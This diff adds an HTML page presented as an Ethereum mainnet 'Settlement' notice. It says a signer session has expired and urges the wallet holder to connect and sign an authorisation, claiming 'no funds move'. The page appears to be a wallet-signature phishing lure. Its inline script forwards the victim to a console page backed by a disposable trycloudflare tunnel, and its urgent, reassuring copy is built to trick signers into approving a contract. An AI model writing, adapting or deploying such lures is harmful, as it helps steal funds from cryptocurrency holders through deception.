@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Settlement — signer session required</title>
+<style>
+  :root{--bg:#0b0e13;--panel:#121722;--line:#1e2634;--ink:#e6ecf5;--dim:#8b98ab;--ok:#2fbf71;--warn:#e0a33e;--accent:#3d7bfd}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif}
+  .wrap{max-width:640px;margin:0 auto;padding:44px 20px 80px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:600;margin-bottom:26px}
+  .dot{width:9px;height:9px;border-radius:50%;background:var(--warn);box-shadow:0 0 0 4px rgba(224,163,62,.15)}
+  .tag{margin-left:auto;font-size:11px;color:var(--dim);border:1px solid var(--line);padding:3px 8px;border-radius:999px}
+  h1{font-size:20px;margin:0 0 8px;letter-spacing:-.2px}
+  p{color:var(--dim);margin:0 0 14px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px;margin:18px 0}
+  .kv{display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px dashed var(--line);font-size:13px}
+  .kv:last-child{border:0}.kv b{font-weight:600}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;word-break:break-all}
+  a.btn{display:block;text-align:center;padding:13px;border-radius:9px;background:var(--accent);color:#fff;font-weight:600;text-decoration:none;margin-top:18px}
+  ol{color:var(--dim);font-size:13.5px;padding-left:20px;margin:10px 0 0}
+  li{margin:6px 0}
+  .foot{margin-top:28px;font-size:11px;color:#5d6a7d}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand"><span class="dot"></span> Settlement <span class="tag">mainnet</span></div>
+
+  <h1>Signer session expired — payouts paused</h1>
+  <p>The dispatch signer stopped heartbeating at 06:12 UTC and the settlement queue is holding. Nothing
+     is lost; the float is intact and legs are retried once the signer session is authorised again.</p>
+
+  <div class="card">
+    <div class="kv"><span>Signer address</span><b class="mono">0x63c79fccd0a21e4a4d87056a0efe3b85d8c373d4</b></div>
+    <div class="kv"><span>Queue</span><b>17 legs held</b></div>
+    <div class="kv"><span>Oldest leg</span><b>41 min</b></div>
+    <div class="kv"><span>Network</span><b>ethereum mainnet</b></div>
+  </div>
+
+  <p><strong>To resume:</strong> open the signer session and authorise the settlement contract with the
+     signing wallet. One signature, no gas, no funds move.</p>
+  <ol>
+    <li>Connect the signer wallet (the address above)</li>
+    <li>Confirm the pinned nonce</li>
+    <li>Sign the authorisation</li>
+  </ol>
+
+  <a class="btn" href="./console.html" id="go">Open signer session</a>
+
+  <div class="foot">If the wallet is on another network, switch to Ethereum mainnet first. The session is
+     valid for a single dispatch and expires if the signer sends in the meantime.</div>
+</div>
+<script>
+  // Carry the API base through to the console so one static front door can outlive a tunnel change.
+  window.__API__ = 'https://reduced-converted-gates-shelf.trycloudflare.com'
+  const q = new URLSearchParams(location.search)
+  const api = q.get('api') || window.__API__
+  if (api) document.getElementById('go').href = './console.html?api=' + encodeURIComponent(api)
+</script>
+</body>
+</html>
